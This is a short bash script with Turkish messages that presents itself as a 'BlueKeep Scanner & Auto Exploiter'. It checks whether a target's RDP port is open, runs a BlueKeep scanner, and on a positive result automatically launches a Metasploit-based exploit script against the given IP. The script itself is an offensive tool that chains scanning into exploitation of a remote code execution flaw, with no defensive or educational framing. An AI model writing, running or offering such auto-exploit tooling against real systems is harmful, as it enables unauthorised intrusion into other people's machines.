#!/bin/bash

# Renkli çıktı için
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
cat << "EOF"
 ____  __           __ __                
/ __ )/ /_  _____  / //_/__  ___ ____    
/ __  / / / / / _ \/ ,< / _ \/ -_) __/    
/ /_/ / /___/ /  __/ /| /  __/\__/_/     
/_____/_____/_/\___/_/ |_\___/            
                                         
EOF
echo -e "BlueKeep Scanner & Auto Exploiter\n${NC}"

# Kontrol parametreleri
if [ $# -lt 1 ]; then
    echo -e "${RED}Kullanım: $0 <hedef-ip> [port]${NC}"
    exit 1
fi

TARGET_IP=$1
PORT=${2:-3389}

# RDP portunu kontrol et
echo -e "${YELLOW}[*] RDP portu kontrol ediliyor: $TARGET_IP:$PORT...${NC}"
nc -z -w 3 $TARGET_IP $PORT

if [ $? -ne 0 ]; then
    echo -e "${RED}[-] RDP portu kapalı veya erişilemez: $TARGET_IP:$PORT${NC}"
    echo -e "${YELLOW}[?] Yine de devam etmek istiyor musunuz? (e/h)${NC}"
    read answer
    if [[ "$answer" != "e" && "$answer" != "E" ]]; then
        exit 1
    fi
fi

# Tarama işlemi
echo -e "${YELLOW}[*] BlueKeep taraması başlatılıyor...${NC}"
python3 bluekeep_scanner.py -i $TARGET_IP -p $PORT

# Sonuç "Auxiliary module execution completed" ise
if [ $? -eq 0 ]; then
    echo -e "${YELLOW}[*] İşletim sistemi tespiti ve exploit başlatılıyor...${NC}"
    python3 metasploit_bluekeep.py -i $TARGET_IP -p $PORT -A -f
fi

echo -e "${GREEN}[+] İşlem tamamlandı${NC}"
